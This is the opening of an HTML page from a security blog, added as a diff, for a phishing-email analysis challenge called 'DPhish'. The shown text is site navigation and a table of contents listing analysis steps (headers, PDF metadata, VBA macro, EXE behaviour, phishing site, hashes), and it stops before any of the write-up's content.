@@ -1,0 +1,2294 @@
+<!DOCTYPE html><html lang="en" class="no-js"><head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Just My Articles">
+      
+      
+        <meta name="author" content="ReemKhalid">
+      
+      
+        <link rel="canonical" href="https://x-ray2004.github.io/My-Blog/soc/dPhish2026-ar/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>DPhish — Phishing Email Analysis - VampireXRAY Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Cairo:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Cairo";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            .gscrollbar-fixer { padding-right: 15px; }
+            .gdesc-inner { font-size: 0.75rem; }
+            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
+            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
+            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
+        </style></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#dphish-phishing-email-analysis" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="VampireXRAY Blog" class="md-header__button md-logo" aria-label="VampireXRAY Blog" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M.75 8S5 7 8 9c0 0 .5 3.75 2.5 3.75V11s.5 1 1.5 1 1.5-1 1.5-1v1.75C15.5 12.75 16 9 16 9c3-2 7.25-1 7.25-1-2 1-2.25 4.5-2.25 4.5-4 0-4 3.25-4 3.25-5-1-5 2.75-5 2.75s0-3.75-5-2.75c0 0 0-3.25-4-3.25C3 12.5 2.75 9 .75 8"></path></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            VampireXRAY Blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              DPhish — Phishing Email Analysis
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Light mode" type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Light mode" for="__palette_1" hidden="">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Dark mode" type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Dark mode" for="__palette_0" hidden="">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required="">
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix="">
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../cve/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  CVE Analysis
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../books/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Summaries
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../" class="md-tabs__link">
+        
+  
+  
+    
+  
+  SOC Reports
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../ctf/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  CTF Writeups
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../other/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Other
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="VampireXRAY Blog" class="md-nav__button md-logo" aria-label="VampireXRAY Blog" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M.75 8S5 7 8 9c0 0 .5 3.75 2.5 3.75V11s.5 1 1.5 1 1.5-1 1.5-1v1.75C15.5 12.75 16 9 16 9c3-2 7.25-1 7.25-1-2 1-2.25 4.5-2.25 4.5-4 0-4 3.25-4 3.25-5-1-5 2.75-5 2.75s0-3.75-5-2.75c0 0 0-3.25-4-3.25C3 12.5 2.75 9 .75 8"></path></svg>
+
+    </a>
+    VampireXRAY Blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix="">
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cve/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../books/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Summaries
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Summaries
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../books/SansSEC450-Notes/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SansSEC450-Notes
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    SansSEC450-Notes
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/SansSEC450-Notes/chapter-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/SansSEC450-Notes/chapter-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/SansSEC450-Notes/chapter-3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 3
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/SansSEC450-Notes/chapter-4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 4
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/SansSEC450-Notes/chapter-5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 5
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../books/cloud/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud Fundamentals AWS
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Cloud Fundamentals AWS
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/cloud/chapter-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/cloud/chapter-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/cloud/chapter-3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 3
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/cloud/chapter-4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 4
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/cloud/chapter-5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 5
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/cloud/chapter-6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 6
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/cloud/chapter-7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 7
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/cloud/chapter-8/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 8
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/cloud/chapter-9/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 9
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../books/cloud/chapter-10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 10
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SOC Reports
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CTF Writeups
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../other/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Other
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#challenge-description" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Challenge Description
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        البداية — فتح الملف
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#warm-up-subject-line" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Warm-up: Subject Line
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phase-1-email-headers-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 1 — Email Headers Analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q1-mail-gateway-hostname" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q1 — Mail Gateway Hostname
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q2-originating-ip-address" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q2 — Originating IP Address
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q3-spf-verification-result" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q3 — SPF Verification Result
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q4-reply-to-email-address" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q4 — Reply-To Email Address
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q5-mail-client-tool-used" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q5 — Mail Client / Tool Used
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q6-message-id-domain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q6 — Message-ID Domain
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phase-2-attachments-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 2 — Attachments Analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        استخراج الملفات
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        التحقق من الملفات
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phase-3-pdf-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 3 — PDF Analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q7-pdf-creation-tool" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q7 — PDF Creation Tool
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q8-pdf-author" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q8 — PDF Author
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q9-pdf-producer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q9 — PDF Producer
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q10-custom-reference-keyword" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q10 — Custom Reference Keyword
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q11-employee-id" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q11 — Employee ID
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phase-4-vba-macro-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 4 — VBA Macro Analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        كيف عرفنا إن في ماكرو؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        كود الماكرو كامل
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q12-xor-key" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q12 — XOR Key
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q13-deobfuscated-c2-url" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q13 — Deobfuscated C2 URL
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q14-http-method" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q14 — HTTP Method
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q15-auto-execute-subroutine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q15 — Auto-execute Subroutine
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q16-dead-code-function" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q16 — Dead Code Function
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q17-department-code" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q17 — Department Code
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phase-5-exe-binary-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 5 — EXE Binary Analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q18-exe-c2-url" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q18 — EXE C2 URL
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q19-registry-key-path" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q19 — Registry Key Path
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q20-registry-value-name" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q20 — Registry Value Name
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q21-target-applications" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q21 — Target Applications
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q22-user-agent-string" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q22 — User-Agent String
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q23-mutex-name" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q23 — Mutex Name
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q24-vmsandbox-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q24 — VM/Sandbox Detection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q25-target-file-extensions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q25 — Target File Extensions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phase-6-phishing-website" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 6 — Phishing Website
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q26-verification-pin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q26 — Verification PIN
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q27-transaction-id" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q27 — Transaction ID
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q28-internal-reference-number" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q28 — Internal Reference Number
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phase-7-file-hashes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 7 — File Hashes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#q29-sha256-of-vba-macro-file" class="md-nav__link">
